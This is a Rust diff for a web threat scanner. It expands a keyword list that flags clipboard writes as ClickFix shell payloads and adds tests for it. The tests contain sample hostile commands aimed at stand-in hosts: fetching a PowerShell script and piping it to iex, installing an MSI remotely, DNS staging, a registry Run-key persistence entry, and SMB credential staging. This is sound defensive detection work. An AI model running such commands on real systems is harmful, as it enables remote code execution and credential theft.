@@ -290,10 +290,16 @@ impl ThreatReport {
             }
             JsFlag::ClipboardWrite { method, payload } => {
                 let lower = payload.to_ascii_lowercase();
+                // Keep this keyword class in sync with the Python analyser's _SHELL_CMD_RE
+                // in backend/scanner/modules/js_analyser.py (both layers must agree on what
+                // counts as a ClickFix shell payload). "invoke-" covers invoke-expression /
+                // invoke-restmethod / invoke-webrequest; " iex" / "irm " catch the aliases.
                 let is_clickfix = [
-                    "curl ", "powershell", " iex", "cmd.exe", "/bin/bash", "bash -c",
+                    "curl ", "powershell", " iex", "irm ", "cmd.exe", "/bin/bash", "bash -c",
                     "wget ", "python ", "invoke-", "rundll32", "mshta", "certutil",
                     "regsvr32", "wscript", "cscript", "base64 -d",
+                    // LoLBAS / DNS-staging and CrashFix (KongTuke, Jan 2026) additions:
+                    "msiexec", "nslookup", "reg add", "taskkill", "cmdkey", "net use",
                 ]
                 .iter()
                 .any(|kw| lower.contains(kw));
@@ -491,5 +497,60 @@ impl ThreatReport {
 
     pub fn to_json(&self) -> crate::error::Result<String> {
         Ok(serde_json::to_string_pretty(self)?)
+    }
+}
+
+#[cfg(test)]
+mod clickfix_classification_tests {
+    use super::*;
+
+    fn classify(payload: &str) -> String {
+        let mut report = ThreatReport::new("https://example.test/");
+        report.add_js_flag(JsFlag::ClipboardWrite {
+            method: "navigator.clipboard.writeText".into(),
+            payload: payload.into(),
+        });
+        report
+            .flags
+            .iter()
+            .find(|f| f.code.starts_with("CLIPBOARD_HIJACK"))
+            .map(|f| f.code.clone())
+            .unwrap_or_default()
+    }
+
+    #[test]
+    fn crashfix_and_lolbas_payloads_escalate_to_clickfix() {
+        // Keep parity with the Python _SHELL_CMD_RE keyword class.
+        for payload in [
+            "cmdkey /add:host /user:u /pass:p",            // CrashFix SMB cred staging
+            r"net use \\1.2.3.4\share",                    // SMB UNC mapping
+            "msiexec /i https://evil.test/p.msi /qn",      // LoLBAS installer
+            "nslookup -type=txt c2.evil.test",             // DNS staging
+            "reg add HKCU\\...\\Run /v x /d evil",          // persistence
+            "taskkill /f /im chrome.exe",                  // Chrome-restart step
+            "irm https://evil.test/s.ps1 | iex",            // irm alias
+            "powershell -enc ABC",                          // baseline still classified
+        ] {
+            assert_eq!(
+                classify(payload),
+                "CLIPBOARD_HIJACK_CLICKFIX",
+                "expected ClickFix classification for payload: {payload:?}",
+            );
+        }
+    }
+
+    #[test]
+    fn benign_clipboard_write_stays_high_not_clickfix() {
+        for payload in [
+            "SUMMER25",                                    // discount code
+            "https://example.test/share/abc",              // share link
+            "Hello, thanks for copying this text!",        // plain text
+        ] {
+            assert_eq!(
+                classify(payload),
+                "CLIPBOARD_HIJACK",
+                "benign clipboard write must not be classified ClickFix: {payload:?}",
+            );
+        }
     }
 }
